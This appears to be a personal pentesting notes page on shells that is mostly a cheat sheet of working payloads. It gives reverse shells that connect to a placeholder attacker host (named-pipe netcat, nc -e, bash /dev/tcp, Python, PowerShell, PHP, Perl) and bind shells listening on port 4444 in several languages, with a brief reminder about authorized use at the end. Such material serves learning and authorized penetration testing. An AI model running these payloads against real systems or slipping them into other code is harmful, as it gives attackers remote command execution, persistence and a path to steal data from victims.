---
layout: default
title: Reverse Shells
permalink: /notes/shells/
---

# Shells

A **shell** is a software that allows a user to interact with the OS. It can be a GUI, but it's usually CLI, and it depends on the OS on the target system.

In **cyber security**, it commonly refers to specific shell session an attacker uses when accessing a compromised system, allowing them to run **commands** and **execute software**. This opens various windows for usage, such as:

* ***Remote System Control***: Allows attacker to execute commands or software remotely in the target system.

* ***Privilege Escalation***: In case initial access through a shell is limited or restricted, attackers can explore ways to escalate privileges to more elevated or administrative access.

* ***Data Exfiltration***: Once attackers have access to execute commands through an obtained shell, they can explore system to read or copy sensitive data from it.

* ***Persistence and Access Maintenance***: Once shell has been obtained, attackers can create access through users and credentials or copy backdoor software to maintain access to the target system for later usage.

* ***Post-Exploitation Activities***: After access to a shell is granted, attackers can perform a wide range of post-exploitation activities activities, such as deploying malware, creating hidden accounts or deleting information.

* ***Access Other Systems on the Network***: Depending on the nature of the attack, the obtained shell can just be an initial access point. The goal can be to hop through the network to a different target using the obtained shell as a **pivot** to different points in the compromised system network. This is called **pivoting**.

# Types of Shells

## ***Reverse Shells***

A **Reverse Shell**, aka *connect back shell*, is one of the most popular techniques for gaining access to a systems in cyberattacks. The connections initiate from the target machine to the attacker's machine, which can help avoid detection from network firewalls and other security appliances.

**Reverse Shells** require the attackers to setup listeners, to catch the reverse connection thrown from the target victim.

```bash
nc -lvnp DESIGNATED_PORT
```
---
### Types of Reverse Shells
---
## Pipe Reverse Shell
**Pipes** are Unix based mechanisms that allows data to be passed between different programs, attacjers can leverage this feature to control the victim's system through CLI. (This is one of the coolest payload, imo)

```bash
rm -f /tmp/revpipe; mkfifo /tmp/revpipe; cat /tmp/revpipe | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/revpipe
```

## TCP Reverse Shell
A **TCP reverse shell** establishes a persistent connection using the TCP protocol.

**Example (Netcat Linux):**
```bash
nc -e /bin/sh ATTACKER_IP ATTACKER_PORT
```

**Example (Netcat Windows):**
```powershell
nc.exe -e cmd.exe ATTACKER_IP ATTACKER_PORT
```

## UDP Reverse Shell
A **UDP reverse shell** functions similarly to TCP but uses UDP, making it harder to detect due to its stateless nature.

**Example (Netcat UDP):**
```bash
nc -u -e /bin/sh ATTACKER_IP ATTACKER_PORT
```

## Bash Reverse Shell
Bash-based shells are useful when Netcat is unavailable.

```bash
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
```

## Python Reverse Shell
Python shells are versatile and often used in web-based attacks.

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",ATTACKER_PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh", "-i"])
```

## PowerShell Reverse Shell
PowerShell shells are commonly used in Windows environments.

```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP", ATTACKER_PORT)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + "PS " + (pwd).Path + "> "
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()};
$client.Close()
```

## PHP Reverse Shell
Useful for web shells in PHP applications.

```php
<?php
$sock=fsockopen("ATTACKER_IP",ATTACKER_PORT);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```

## Perl Reverse Shell
A lightweight alternative for Unix-based targets.

```perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=ATTACKER_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
---
## ***Bind Shells***

A **bind shell** is a type of shell that listens on a specific port for incoming connections. Once an attacker connects to this port, they gain control over the target system. Unlike a reverse shell, where the target connects back to the attacker, a bind shell requires the attacker to initiate the connection.

# Types of Bind Shells

## Pipe Bind Shell

```bash
rm -f /tmp/bindpipe; mkfifo /tmp/bindpipe; cat /tmp/bindpipe | sh -i 2>&1 | nc -l 0.0.0.0 8080 >/tmp/bindpipe 
```
### Connect to bind shell:

```bash
nc -nv TARGET_IP 8080
```

## TCP Bind Shell
A **TCP bind shell** listens on a designated TCP port, allowing an attacker to connect and execute commands remotely.

**Example (Netcat Linux):**
```bash
nc -lvp 4444 -e /bin/sh
```

**Example (Netcat Windows):**
```powershell
nc.exe -lvp 4444 -e cmd.exe
```

## UDP Bind Shell
A **UDP bind shell** operates over UDP instead of TCP, making it more difficult to detect and filter.

**Example (Netcat UDP):**
```bash
nc -u -lvp 4444 -e /bin/sh
```

## Bash Bind Shell
A simple bind shell using Bash can be set up as follows:

```bash
bash -c 'exec nc -lvp 4444 -e /bin/sh'
```

## Python Bind Shell
Python allows for more flexible and scriptable bind shells.

```python
import socket,subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("0.0.0.0",4444))
s.listen(1)
c,addr=s.accept()
while True:
    data=c.recv(1024)
    if not data: break
    proc=subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout_value = proc.stdout.read() + proc.stderr.read()
    c.send(stdout_value)
c.close()
```

## PowerShell Bind Shell
PowerShell can be used to create a bind shell on Windows systems.

```powershell
$listener = [System.Net.Sockets.TcpListener]4444;
$listener.Start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
$reader = New-Object System.IO.StreamReader($stream);
$writer = New-Object System.IO.StreamWriter($stream);
while ($true) {
    $command = $reader.ReadLine();
    if ($command -eq "exit") { break; }
    $output = iex $command 2>&1 | Out-String;
    $writer.WriteLine($output);
    $writer.Flush();
}
$client.Close();
$listener.Stop();
```

## Perl Bind Shell
A lightweight bind shell using Perl:

```perl
perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
bind(S,sockaddr_in(4444,INADDR_ANY)); listen(S,1); accept(C,S);
while(<C>){system($_)}'
```
---

## Conclusion
Shells are a powerful tool in red teaming, penetration testing, and ethical hacking. However, they should only be used in authorized environments. Always ensure proper permissions before testing. Don't be following the theory of ***mess around and find out***.

 **Happy Hacking!**

